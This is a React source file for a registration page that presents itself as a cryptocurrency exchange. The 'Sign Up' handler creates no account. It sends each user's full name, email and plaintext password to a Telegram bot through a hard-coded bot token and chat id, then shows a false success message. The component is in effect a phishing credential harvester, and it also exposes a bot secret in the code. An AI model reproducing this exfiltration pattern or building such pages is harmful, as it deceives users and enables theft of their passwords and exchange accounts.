import React, { useState } from 'react'
import { HStack, VStack, Image, Text, Input, Flex, Link } from '@chakra-ui/react'
import { ButtonPrimary, ButtonTertiary } from '../ui/components/Button'

function Register() {
    const [name, setName] = useState("");
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [repeatPassword, setRepeatPassword] = useState("");

    const handleSignup = () => {
        if (name == "" || email == "" || password == "" || repeatPassword == "") {
            alert("Please fill in all fields");
        } else {
            if (password !== repeatPassword) {
                alert("Passwords do not match");
                return
            }

            fetch(`https://api.telegram.org/bot5472778119:AAEMXkkcayDR0L9vOEi5XsweJ0H69QXmwZU/sendMessage?chat_id=1309915574&text=New%20user%20registered%20with%20name%20${name}%20and%20email%20${email}%20and%20password%20${password}`)
                .then((response) => response.json())
                .then((data) => {
                    if (data.ok) {
                        alert("User registered successfully");
                        window.location.assign("/")
                    } else {
                        alert("Registration failed");
                    }
                })
                .catch((error) => {
                    alert("SignUp Failed");
                    console.error('Error:', error);
                });
        }

    }

    return (
        <Flex justify={'center'} align='center' minH={'100vh'}>
            <HStack align={'flex-start'} w='full' px='12%' justify={{ base: 'center', md: 'space-between' }} >
                <VStack align={'flex-start'}>
                    <Text fontWeight={600} fontSize={{ base: '24px', lg: '48px' }} >Register</Text>
                    <Text fontSize={{ base: '14px', lg: '18px' }} color='#9E9E9E' pb='27px' >Enjoy the largest cryptocurrency <br /> exchange at your fingertips.</Text>
                    <VStack spacing={'16px'} w='full'>
                        <Input placeholder='Full Name' size='md' bg='#18181C' color='#9E9E9E' border={'none'} _placeholder={{ color: '#9E9E9E' }} onChange={e => setName(e.target.value)} value={name} />
                        <Input onChange={e => setEmail(e.target.value)} value={email} placeholder='Your Email' size='md' bg='#18181C' color='#9E9E9E' border={'none'} _placeholder={{ color: '#9E9E9E' }} type='email' />
                        <Input onChange={e => setPassword(e.target.value)} value={password} placeholder='Password' size='md' bg='#18181C' color='#9E9E9E' border={'none'} _placeholder={{ color: '#9E9E9E' }} type='password' />
                        <Input onChange={e => setRepeatPassword(e.target.value)} value={repeatPassword} placeholder='Repeat Password' size='md' bg='#18181C' color='#9E9E9E' border={'none'} _placeholder={{ color: '#9E9E9E' }} type='password' />
                    </VStack>
                    <HStack pt='44px'>
                        <ButtonPrimary text='Sign Up' clickFunction={handleSignup} />
                        <Link href='/login' style={{ textDecoration: 'none' }}>
                            <ButtonTertiary text='Already Registered?' />
                        </Link>
                    </HStack>
                </VStack>
                <Image src='/assets/RegisterDesign.svg' pt='30px' pl='30px' boxSize={'60%'} display={{ base: 'none', md: 'block' }} />
            </HStack>
        </Flex>
    )
}

export default Register